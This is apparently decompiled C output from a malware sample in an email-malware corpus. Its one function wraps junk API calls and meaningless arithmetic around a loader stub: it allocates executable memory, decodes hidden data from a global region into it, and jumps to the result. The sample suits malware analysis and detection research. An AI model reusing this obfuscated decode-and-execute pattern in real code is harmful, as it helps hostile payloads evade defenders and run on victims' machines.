// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1167/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401278(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 dwArg00, word32 dwArg01, word32 dwArg02, word32 dwArg03, word32 dwArg05, word32 dwArg07, word32 dwArg09, word32 dwArg0A, word32 dwArg0C)
{
// def fp
// def edx
// def ecx
// def dwLoc0104
// def dwLoc01B0
// def dwArg02
// def dwLoc0224
// def dwArg0A
// def dwLoc01CD
// def dwLoc01CC
// def dwLoc023B
// def dwLoc024C
// def dwArg0C
// def dwLoc02
// def dwLoc9C
// def dwLoc94
	if (edx != 0x000003BD)
		;
	dwLoc02A0_18 = fp - 0x00000004;
	v11_19 = fp - 0x00000100;
	dwLoc02A0_20 = fp - 0x00000100;
	ecx_22 = ecx & 0x00000000;
	dwLoc02A4_24 = ecx & 0x00000000;
	GetCPInfo(ecx & 0x00000000, fp - 0x00000100);
	GetCurrentProcessId();
	GetCurrentThreadId();
	if (fp == (Eq_5 *) 0x0000028C)
		;
	dwLoc02A0_35 = 0x00000002;
	dwLoc02A4_37 = fp - 0x00000004;
	v13_38 = fp - 0x000000CC;
	dwLoc02A4_39 = fp - 0x000000CC;
	dwLoc02A8_42 = fp - 0x00000074;
	dwLoc02AC_44 = fp - 0x00000004;
	v14_45 = fp - 0x0000008C;
	dwLoc02AC_46 = fp - 0x0000008C;
	dwLoc02B0_48 = fp - 0x00000004;
	v15_49 = fp - 0x00000060;
	dwLoc02B0_50 = fp - 0x00000060;
	dwLoc02B4_52 = 0x00000000;
	dwLoc02B8_55 = 0x00000012;
	dwLoc02BC_57 = fp - 0x00000004;
	v16_58 = fp - 0x0000005C;
	dwLoc02BC_59 = fp - 0x0000005C;
	RegEnumKeyExA(fp - 0x0000005C, 0x00000012, 0x00000000, fp - 0x00000060, fp - 0x0000008C, fp - 0x00000074, fp - 0x000000CC, 0x00000002);
	dwLoc02A0_69 = fp - 0x0000016C;
	dwLoc02A4_71 = 0x00000000;
	dwLoc02A8_73 = 0x00000015;
	OpenMutexA(0x00000015, 0x00000000, fp - 0x0000016C);
	dwLoc02A0_77 = 0x00000000;
	dwLoc02A4_80 = fp - 0x0000007C;
	dwLoc02A8_82 = fp - 0x00000004;
	v19_83 = fp - 0x000000A4;
	dwLoc02A8_84 = fp - 0x000000A4;
	dwLoc02AC_87 = &fp->tFFFFFD60;
	dwLoc02B0_90 = &fp->tFFFFFD60;
	dwLoc02B4_93 = 0x00000017;
	dwLoc02B8_96 = 0x00000008;
	dwLoc02BC_98 = fp - 0x00000004;
	v20_99 = fp - 0x000000A8;
	dwLoc02BC_100 = fp - 0x000000A8;
	RegEnumValueW(fp - 0x000000A8, 0x00000008, 0x00000017, &fp->tFFFFFD60, &fp->tFFFFFD60, fp - 0x000000A4, fp - 0x0000007C, 0x00000000);
	dwLoc02A0_108 = fp - 0x0000017C;
	edx_109 = &fp->tFFFFFD60 & 0x00000000;
	dwLoc02A4_111 = edx_109;
	edx_112 = edx_109 & 0x0000000D;
	dwLoc02A8_114 = edx_109 & 0x0000000D;
	OpenEventA(edx_109 & 0x0000000D, edx_109, fp - 0x0000017C);
	dwLoc02A0_122.u0 = 0x00000012;
	dwLoc02A4_125 = 0x00000013;
	dwLoc02A8_127 = fp - 0x00000004;
	v23_128 = fp - 0x0000005C;
	dwLoc02A8_129 = fp - 0x0000005C;
	eax_130 = InitializeAcl(fp - 0x0000005C, 0x00000013, 0x00000012);
	ecx_134 = &fp->tFFFFFD60 - dwLoc0104;
	if (ecx_134 != 0x00000386)
	{
		ecx_786 = ecx_134 + eax_130 + (ecx_134 <u 0x00000386);
		ecx_791 = ecx_786 | 0x00002FF5;
	}
// ecx_144 = PHI(ecx_134, ecx_791)
	esp_146 = fp - 0x000002A0;
	fp->tFFFFFD60.u0 = 0x00000000;
	malloc(0x00000012);
	ecx_152 = ecx_144 & dwLoc01B0;
	eax_156 = GetOEMCP();
	ecx_164 = ecx_152 & eax_156;
	if (ecx_164 == 0x00000324)
		;
	esp_172 = fp - 0x000002A0;
	fp->tFFFFFD60.u0 = 0x00000014;
	esp_174 = fp - 0x000002A4;
	fp->tFFFFFD60.u0 = fp - 0x00000004;
	fp->tFFFFFD60.u0 = 0xFFFFFF6B;
	dwLoc02A8_182 = &fp->tFFFFFD60;
	dwLoc02AC_186 = &fp->tFFFFFD60;
	dwLoc02B0_189 = fp - 0x00000058;
	esp_191 = fp - 0x000002B4;
	fp->tFFFFFD60.u0 = 0x00000000;
	ecx_193 = fp - 0x00000058 & 0x00000000;
	esp_194 = fp - 0x000002B8;
	fp->tFFFFFD60.u0 = ecx_193;
	dwLoc02BC_199 = fp - 0x00000120;
	eax_200 = RegEnumKeyExA(fp - 0x00000120, 0x00000008, 0x00000017, fp - 0x00000058, &fp->tFFFFFD60, &fp->tFFFFFD60, 0x00000013, 0x00000000);
	ecx_203 = ecx_193 & eax_200;
	esp_204 = fp - 0x000002A0;
	fp->tFFFFFD60.u0 = 0x00000002;
	ecx_206 = ecx_203 | &fp->tFFFFFD60;
	if (ecx_206 != 0x00000087)
		;
	__set_app_type();
	eax_220 = eax_200 ^ dwArg02;
	eax_223 = eax_220;
	eax_224 = eax_220 + 0x00000861;
	eax_225 = eax_220 + 0x00000861 | 0x00003FC7;
	dwLoc02A4_228 = &fp->tFFFFFD60;
	dwLoc02A8_230 = 0x00000000;
	eax_231 = eax_225 & 0x00000000;
	dwLoc02AC_233 = eax_225 & 0x00000000;
	OpenMutexA(eax_225 & 0x00000000, 0x00000000, &fp->tFFFFFD60);
	dwLoc02A4_238 = fp - 0x00000084;
	dwLoc02A8_242 = &fp->tFFFFFD60;
	dwLoc02AC_245 = fp - 0x00000078;
	eax_246 = RegOpenKeyA(fp - 0x00000078, &fp->tFFFFFD60, fp - 0x00000084);
	dwLoc02A4_255 = fp - 0x00000180;
	eax_256 = eax_246 & 0x00000000;
	dwLoc02A8_258 = eax_246 & 0x00000000;
	GetCPInfo(eax_246 & 0x00000000, fp - 0x00000180);
	if (fp == (Eq_5 *) 0x000003AB)
		;
	dwLoc02A4_266.u0 = 0x00000000;
	dwLoc02A8_268 = fp - 0x00000004;
	v33_269 = fp - 0x00000068;
	dwLoc02A8_270 = fp - 0x00000068;
	dwLoc02AC_273 = 0x0000000A;
	dwLoc02B0_276 = &fp->tFFFFFD60;
	RegEnumKeyA(&fp->tFFFFFD60, 0x0000000A, fp - 0x00000068, 0x00000000);
	GetOEMCP();
	ecx_290 = &fp->tFFFFFD60 | 0x0000000A;
	if ((dwLoc0224 & ecx_290) != 0x00000000)
		;
	esp_297 = &fp->dwFFFFFD5C;
	fp->dwFFFFFD5C = 0x0000000A;
	dwLoc02A8_301 = fp - 0x00000078;
	esp_302 = &fp->dwFFFFFD54;
	fp->dwFFFFFD54 = 0x00000000;
	dwLoc02B0_306 = &fp->tFFFFFD60;
	RegEnumKeyA(&fp->tFFFFFD60, 0x0000000A, fp - 0x00000078, 0x00000000);
	ecx_309 = &fp->tFFFFFD60;
	esp_313 = &fp->dwFFFFFD5C;
	fp->dwFFFFFD5C = fp - 0x00000004;
	fp->dwFFFFFD5C = 0xFFFFFF74;
	dwLoc02A8_318.u0 = 0x00000000;
	esp_320 = &fp->dwFFFFFD54;
	fp->dwFFFFFD54 = 0x0000000A;
	eax_322 = OpenMutexA(0x0000000A, 0x00000000, 0x00000000);
	if (eax_322 == 0x00000000)
	{
		ecx_735 = fp + 0xFFFFC3AF | dwLoc94;
		ecx_736 = ecx_735 ^ 0x00001662;
	}
// ecx_334 = PHI(ecx_309, ecx_736)
	dwLoc02A4_338 = fp - 0x00000154;
	esp_339 = &fp->dwFFFFFD58;
	fp->dwFFFFFD58 = fp - 0x00000004;
	fp->dwFFFFFD58 = 0xFFFFFF48;
	esp_346 = &fp->dwFFFFFD54;
	fp->dwFFFFFD54 = &fp->tFFFFFD60;
	RegOpenKeyA(0x0000000A, 0x00000000, fp - 0x00000154);
	if (ecx_334 != 0x00000000)
		ecx_720 = fp - 0x00000004;
// ecx_360 = PHI(ecx_334, ecx_720)
	GetLastError();
	dwLoc02A4_365 = 0x00000000;
	dwLoc02A8_370 = 0x00000000;
	ecx_372 = ecx_360 | 0x0000306C;
	dwLoc02AC_374 = 0x00000000;
	eax_376 = CreateItemMoniker(0x00000000, 0x00000000, null);
	eax_378 = eax_376 ^ 0x80070057;
	if ((eax_376 ^ 0x80070057) == 0x00000000)
	{
		ecx_467 = ecx_372 | dwArg0A;
		esp_468 = &fp->dwFFFFFD5C;
		Mem469[fp + 0xFFFFFD5C:word32] = fp + 0xFFFFF4B2;
		esp_470 = &fp->dwFFFFFD58;
		fp->dwFFFFFD58 = ecx_467;
		esp_472 = &fp->dwFFFFFD54;
		fp->dwFFFFFD54 = fp - 0x00000004;
		if (ecx_467 != 0x000000DB)
			;
		dwLoc02C4_491 = 0x00000040;
		dwLoc02C8_502 = 0x00001000;
		dwLoc02CC_504 = 0x00003000;
		dwLoc02D0_507 = 0x00000000;
		eax_512 = VirtualAlloc(0x00000000, 0x00003000, 0x00001000, 0x00000040);
		dwLoc0254_514 = eax_512;
		ecx_526 = fp - 0x00000004 | dwLoc01CC;
		ecx_527 = ecx_526 ^ dwLoc01CD;
		edx_528 = &globals->dw40A55C;
		C_534 = false;
		ecx_535 = ecx_527 - &fp->tFFFFFD60;
		esi_539 = eax_512;
		ecx_544 = ecx_535 + dwLoc023B;
		dwLoc0230_545 = 0x6DAA4D6B;
		eax_546 = &fp->tFFFFFD60 | 0x000034FC;
		ecx_548 = ecx_544;
		if (eax_546 == dwLoc024C)
		{
			ecx_696 = &fp->tFFFFFD60 ^ 0x0000030E;
			goto l0040170E;
		}
l0040170E:
		do
		{
// dwLoc0230_552 = PHI(dwLoc0230_545, dwLoc0230_545, dwLoc0230_575)
// esi_563 = PHI(esi_539, esi_539, esi_612)
// edx_564 = PHI(edx_528, edx_528, edx_596)
// ecx_567 = PHI(ecx_548, ecx_696, ecx_613)
			edi_571 = *edx_564;
			edi_572 = edi_571 + dwLoc0230_552;
			v54_574 = dwLoc0230_552 + 0xDD51B89F;
			dwLoc0230_575 = v54_574;
			Mem576[esi_563 + 0x00000000:word32] = edi_572;
			if (ecx_567 != &fp->tFFFFFD60)
				;
			edx_583 = edx_564 + 202742849;
			ebx_586 = &fp->tFFFFFD60 + ecx_567 + (edx_583 <u 0x00000000);
			eax_587 = fp - 0x00000004;
			ecx_590 = ecx_567 | dwArg0C;
			ecx_591 = ecx_590 + dwArg0C;
			ecx_593 = ecx_591 ^ dwLoc02;
			esi_594 = esi_563 + 0x4F6AAD16;
			ecx_595 = ecx_593 + 0x00000EA7;
			edx_596 = edx_583 + 0x30567108;
			if (ebx_586 == 0x00000245)
				eax_677 = &fp->tFFFFFD60 & 0x000006A9;
// eax_609 = PHI(eax_587, eax_677)
			esi_612 = esi_594 + 0xB09552EE;
			ecx_613 = ecx_593 + 0x00000EA7 ^ 0x00002367;
		} while (edx_596 != &globals->dw40B5AC);
		ecx_616 = ecx_613 & eax_609;
		if (dwLoc9C == eax_609)
			ecx_667 = &fp->tFFFFFD60;
// ecx_622 = PHI(ecx_616, ecx_667)
		ecx_623 = ecx_622 & 0x00003326;
		C_625 = false;
		dwLoc0254_514();
		ecx_643 = ecx_623 + ebx_586 + C_625;
		ecx_644 = ecx_643 - ebx_586;
		if (ebx_586 == ecx_644)
			;
	}
	return;
}

